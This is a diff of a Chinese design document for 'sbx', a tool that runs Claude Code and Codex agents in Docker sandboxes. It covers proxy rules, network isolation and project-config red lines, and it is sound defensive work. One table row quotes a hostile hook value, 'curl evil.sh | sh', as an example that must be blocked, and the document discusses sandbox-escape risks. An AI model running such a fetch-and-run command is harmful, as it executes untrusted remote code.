@@ -2,9 +2,9 @@
 
 | 项 | 内容 |
 |---|---|
-| 状态 | 设计稿 v1.1（已根据 M0 验证结果修订；尚未实现） |
-| 日期 | 2026-10-04 |
-| 依据 | [CONTEXT.md](CONTEXT.md)（术语表）、ADR 0001–0016（`private/adr/`，未纳入版本控制）、[M0 验证汇总](../spikes/M0-SUMMARY.md) |
+| 状态 | v1.2 —— M0–M4 已实现。本文是运行时的整体设计；边界与前置依赖（prep / services / forward）的完整口径在 [boundary.md](boundary.md) |
+| 日期 | 2026-10-04（M4 后修订于 2026-10-15） |
+| 依据 | [CONTEXT.md](CONTEXT.md)（术语表）、ADR 0001–0019（`private/adr/`，未纳入版本控制）、[M0 验证汇总](../spikes/M0-SUMMARY.md) |
 
 ---
 
@@ -47,36 +47,50 @@ Claude Code 和 Codex 已经承担了大量编码工作。要让它们**放开�
 宿主机（macOS / Linux）
 │
 ├── sbx（Go 单二进制，无常驻进程）
-│     ├─ 读取配置（4 层）与信任哈希 ~/.sbx/trust/
+│     ├─ 读取配置（4 层 + prep 镜像声明）与信任哈希 ~/.sbx/trust/
 │     ├─ 管理 worktree   ~/.sbx/worktrees/<ws>/<task>/
 │     ├─ 管理状态和日志  ~/.sbx/state/<ws>/<task>/
 │     └─ 通过 docker CLI 编排 ──────────────────────────┐
 │                                                        ▼
 └── 容器运行时（Docker Desktop / OrbStack / Colima / Podman 的 Linux VM）
       │
+      ├── 构建期（M4，没有 agent 在场，有网、可用凭据）
+      │    sbx prep build ──► prep 镜像 sbx/prep-<ws>:<digest>
+      │                          ├─► docker cp 播种 sbx-cache（依赖、权重、夹具）
+      │                          └─► /sbx/prep.json 作为第 5 个配置来源（受红线约束）
+      │
       ├── Task: <ws>/feat-x  [proxy = shared，默认]
-      │    ┌───────────────────────┐  net: sbx-<ws>-feat-x (internal)
+      │    ┌───────────────────────┐  net: sbx-<ws>-feat-x (internal，无默认路由)
       │    │ agent 容器             │───────────────┐
       │    │  tmux ─ claude/codex  │ HTTP(S)_PROXY= │
       │    │  非 root，2C/4G       │ http://<task>:<token>@sbx-proxy:3128
       │    │  /<abs>/worktree (rw) │               ▼
       │    │  /<abs>/repo/.git (rw)│        ┌──────────────────┐  net: sbx-egress
       │    │  依赖目录 ← volume     │        │ sbx-proxy（共享）  │──────────────► 互联网
-      │    └───────────────────────┘   ┌──►│ proxy_auth 识别 Task│──► 上游代理（可选）
-      │                                │   │ 按 Task 套用白名单  │   host.docker.internal
-      ├── Task: <ws>/fix-y  [shared] ──┘   └──────────────────┘
+      │    └───────────────────────┘       │ proxy_auth 识别 Task│──► 上游代理（可选）
+      │      │      ▲       ▲              │ 按 Task 套用白名单  │   host.docker.internal
+      │      │      │       │              └──────────────────┘
+      │      │      │       └── [[services]] 伴生容器（postgres / redis…）
+      │      │      └────────── sbx port：反方向转发容器，把容器端口送到宿主机
+      │      └───────────────── [[forward]] socat sidecar，一条一个 地址:端口
+      │                              └──► 宿主机端口 / 内网私有地址（仅此，不是网关）
+      │
+      ├── Task: <ws>/fix-y  [shared]
       │    （有自己的 internal 网络；共享 proxy 也接入这个网络）
       │
       ├── Task: <ws>/spike  [proxy = dedicated]
       │    agent 容器 ──► sbx-<ws>-spike-proxy（独占 sidecar，无需认证）──► 互联网
       │
       └── 全局共享 volume：sbx-home（登录态） sbx-cache（包缓存） sbx-mise（运行时）
+           └─► sbx clean 回收：旧镜像 + 派生缓存，--deep 再加包缓存与 BuildKit 缓存
 ```
 
 **关键点**
 - Agent 进程本身跑在容器里，而不仅仅是它执行的命令（ADR 0001）。
-- 每个 Task 有一个 agent 容器和一个 internal 网络。agent 容器没有直接出口，只能经过 squid（ADR 0005）。
+- **Task 容器永远没有默认路由。** 它跑在 `--internal` 网络上，squid 和 forwarder 都是这个网络里的 **peer 而不是网关**。这是整个安全模型的支点，所有机制都不得破坏它（[boundary.md](boundary.md) §0，有集成测试兜底）。
 - squid 有两种部署（ADR 0014）：**默认全局共享一个 `sbx-proxy`**，通过代理认证区分 Task；配置了 `proxy = "dedicated"` 的 Task 使用独占的 sidecar。两种部署下，Task 之间的网络都互不可达。
+- **时间被切成了两段**（M4）：构建期有网有凭据但没有 agent，运行期有 agent 但没有凭据。「拉依赖」这类**结果是字节**的需求全部归构建期的 prep；只有「连活的东西」才留在运行期，走 `services` 或 `forward`。判据与完整边界见 [boundary.md](boundary.md)。
+- 一个 Task 现在是**一组容器**：agent 容器 + 若干 service + 若干 forwarder，生命周期一起走，`sbx done` 一起回收。
 - `sbx` 是无状态的命令行工具，所有状态都在文件系统和 docker 对象里（容器、volume、network 上的 label）。
 
 ---
@@ -287,13 +301,18 @@ Workspace (git 仓库) 1 ──── * Task 1 ──── 1 Sandbox
 
 ```squid
 http_port 3128
-acl allowlist dstdomain "/etc/squid/allowlist.txt"
 acl SSL_ports port 443
 acl CONNECT method CONNECT
+http_access deny CONNECT !SSL_ports       # 两种模式都有：CONNECT 只能打到 443
 
-# allowlist 模式（open 模式下把下面两行换成 http_access allow all）
-http_access allow CONNECT SSL_ports allowlist
-http_access allow allowlist
+acl blocked dstdomain "/etc/sbx/block.txt"
+http_access deny blocked                  # 策略拦截，排在放行之前，open 下也生效
+
+# allowlist 模式
+acl allowed dstdomain "/etc/sbx/allow.txt"
+http_access allow CONNECT SSL_ports allowed
+http_access allow allowed
+# open 模式：上面三行换成 http_access allow all
 http_access deny all
 
 # 可选：串联宿主机代理
@@ -313,8 +332,9 @@ auth_param basic program /usr/lib/squid/basic_ncsa_auth /etc/squid/passwd
 auth_param basic realm sbx
 acl SSL_ports port 443
 acl CONNECT method CONNECT
+http_access deny CONNECT !SSL_ports   # 全局，排在 include 之前：open 模式也绕不过
 include /etc/squid/tasks/*.conf
-http_access deny all
+http_access deny all                  # 兜底：没通过认证的请求哪个模式都出不去
 
 cache_peer host.docker.internal parent 7890 0 no-query default   # 可选
 never_direct allow all
@@ -326,14 +346,30 @@ cache deny all
 ```squid
 # tasks/<task-id>.conf（allowlist 模式）
 acl u_<id> proxy_auth <task-id>
-acl a_<id> dstdomain "/etc/squid/allow/<task-id>.txt"
+acl blk_<id> dstdomain "/etc/sbx/block/<task-id>.txt"
+http_access deny u_<id> blk_<id>
+acl a_<id> dstdomain "/etc/sbx/allow/<task-id>.txt"
 http_access allow u_<id> CONNECT SSL_ports a_<id>
 http_access allow u_<id> a_<id>
 
-# tasks/<task-id>.conf（open 模式）
+# tasks/<task-id>.conf（open 模式）——只有 allow 那一侧不同，deny 原样保留
 acl u_<id> proxy_auth <task-id>
+acl blk_<id> dstdomain "/etc/sbx/block/<task-id>.txt"
+http_access deny u_<id> blk_<id>
 http_access allow u_<id>
 ```
+
+**`open` 不等于不设防。** 它关掉的只有「目标域名的事前枚举」这一条，下面五条在两种模式下完全一样：
+
+| | 为什么 open 动不了它 |
+|---|---|
+| 流量必须经过 squid | Task 跑在 `--internal` 网络上，没有默认路由。这是网络拓扑的事实，和 squid 配置无关 |
+| 必须通过代理认证 | shared 下 `proxy_auth <task-id>` 一个 Task 一组凭据；主配置末尾 `http_access deny all` 兜底 |
+| 策略拦截继续生效 | `policy-block` 列表的 `deny` 排在 `allow` 之前（`network.cloud_mcp` 控制） |
+| CONNECT 只能打到 443 | `http_access deny CONNECT !SSL_ports` 在 include 之前。**拿 CONNECT 当任意 TCP 隧道这条路 open 下照样堵死** |
+| 访问日志全量记录 | `logformat sbx` 带用户名和目标，`sbx net denied` 读的就是它 |
+
+所以两种模式的差别是**事前拦住**和**事后可见**。实现上 `Allow` 列表在 open 模式下也照常渲染（`proxySpec`），这样改回 `allowlist` 时白名单是现成的。另见 [boundary.md §3.5](boundary.md)：接入 🔴 级 `forward` 之后，"事后可见"不再够用，该切回 `allowlist`。
 
 - 共享模式下只有一个上游配置，来自个人全局配置。需要不同上游的 Task 应该用 dedicated 模式。
 - squid 容器的启动命令先删 `/run/squid.pid` 再 `exec squid -NYC`，并在配置里设 `shutdown_lifetime 1 seconds`：否则 `docker stop` 超时被 SIGKILL 后残留 PID 文件，下次 `docker start` 时 squid 报 "already running" 退出（M1 实现时发现）。
@@ -454,6 +490,8 @@ http_access allow u_<id>
 
 内置默认 → `~/.sbx/config.toml` → `<repo>/.sbx/sandbox.toml` → `~/.sbx/workspaces/<ws>.toml`。
 
+M4 之后还有**第五个来源**：prep 镜像里的 `/sbx/prep.json`（`LayerPrep`）。它不是文件层，是镜像自带的声明，在上面四层合并完之后并入（`config.MergePrep`），**按项目层的同一套红线检查**——理由一样：prep 镜像是跟着仓库的 Dockerfile 走的，谁 clone 谁就会构建出来。
+
 列表取并集，标量值后者覆盖前者。项目层有红线（见下；M2-2 的三条按键名形状匹配，M4-2 起另有一份按位置精确匹配的显式清单），撞上直接报错。
 
 实现补充（M2-1、M2-2）：
@@ -466,15 +504,17 @@ http_access allow u_<id>
 
 #### 项目层的红线
 
-项目层是跟着仓库走的，clone 下来就生效，所以三类东西不允许写在这一层：
+项目层是跟着仓库走的，clone 下来就生效，所以这几类东西不允许写在这一层：
 
 | 红线 | 判据 | 为什么 |
 |---|---|---|
-| 密钥类字段 | 键名含 `key/token/secret/password/credential` | 这一层不该决定凭据从哪来 |
+| 密钥类字段 | 键名含 `key/token/secret/password/credential` | 这一层不该决定凭据从哪来。两处豁免：`prep.secrets`（只有 BuildKit secret 的 id，值在别处）和 `services.env.*`（给用完即弃的空库设密码，值出不了 Task） |
 | 绝对路径 | 值以 `/`、`~/`、`C:\` 开头 | 这一层不该指向宿主机上的具体路径 |
 | **可执行命令**（M3-10） | 键名形如 `on_*`、`*_cmd`、`*_command`、`*_script`、`*_hook` | 这一层不该决定沙箱里执行什么命令。`on_idle = "curl evil.sh \| sh"` 前两条红线都拦不住，而信任确认时没人会逐行读 shell |
+| **扩大接触面的键**（M4） | 前缀 `forward.`、`prep.secret.` | 开洞和"凭据从哪来"必须是本机的决定。只有 `prep.secrets`（**只有 id，没有值**）是豁免的 |
+| **安全开关键**（M4） | 精确匹配 `git.protect`、`prep.on_drift` | 这些是默认开着的保护。允许项目层关掉，等于把开关交给被保护的对象 |
 
-三条都走通用的 map 遍历，sbx 还不认识的字段也挡得住。
+这些检查都走通用的 map 遍历，sbx 还不认识的字段也挡得住。精确匹配的清单（`projectDenyPrefixes` / `projectExempt` / `projectExemptPrefixes` / `safetyKeys`）见 `internal/config/project.go`；完整口径和四类红线表见 [boundary.md](boundary.md)。
 
 
 ### 9.2 示例
@@ -643,6 +683,7 @@ docs/
 | **M1 MVP** | `run`/`attach`/`ls`/`stop`/`done`；Profile `web-go`；Agent 层叠加；共享 squid（allowlist 模式，proxy_auth 识别 Task）；sbx-home；依赖遮盖 | 能在一个真实仓库上开 2 个并行 Task，让 claude 无人值守完成一次改动，并在主仓库看到对应分支 |
 | **M2 安全与配置** | 4 层配置；信任确认；`net denied/allow`；open 模式；上游代理；`login`；API key | 篡改 `.sbx/` 会被拦住；被拒的域名能一键放行；dedicated proxy 模式可用 |
 | **M3 完整体验** | `py-rust`；自定义 Dockerfile；headless `-p`；状态 hooks 和 `on_idle`/`on_exit`；`port`；资源上限和 OOM 识别；`upgrade`；`drop`；`doctor`；Codex 支持 | 整夜跑 `/auto-it`，第二天通过通知和 `sbx ls` 了解全部结果 |
+| **M4 边界与前置依赖** | R1 缓解（`.git` hooks 只读 + `git.protect`）；`prep`（构建期镜像、播种 `sbx-cache`、`/sbx/prep.json` 配置层）；`[[services]]`；`[[forward]]`；工作区配置层；`clean` | 私有依赖在沙箱里可编译可运行，而凭据不进运行期；Task 仍无默认路由；项目层写不进任何扩大接触面的键。分期与验收见 [boundary.md](boundary.md) §7 |
 
 ---
 
@@ -650,7 +691,7 @@ docs/
 
 | # | 问题 | 影响 | 处理 |
 |---|---|---|---|
-| R1 | `.git` 可写带来的宿主机执行风险（hooks、config） | 沙箱逃逸 | 已接受；M3 之后评估快照比对或 `core.hooksPath` |
+| R1 | `.git` 可写带来的宿主机执行风险（hooks、config） | 沙箱逃逸 | ✅ 已缓解（M4）：`git.protect` 默认开，把 `.git/hooks` 和 `.git/config` 只读挂进容器（`agent.GitProtectMounts`）；它是安全开关键，项目层改不动 |
 | R2 | OAuth 回调在容器里不可用 | 订阅登录受阻 | ✅ Claude 已解除（M0-1）；Codex 在 M3-6 验证 |
 | R3 | macOS bind mount 的 IO 性能 | 构建和测试变慢 | ✅ 已解除（M0-2：依赖放在 volume 时只比宿主机慢 6%） |
 | R4 | 宿主机代理只提供 SOCKS | Squid 无法串联上游 | ✅ 已解除（M0-3：混合端口可以当 HTTP 上游） |
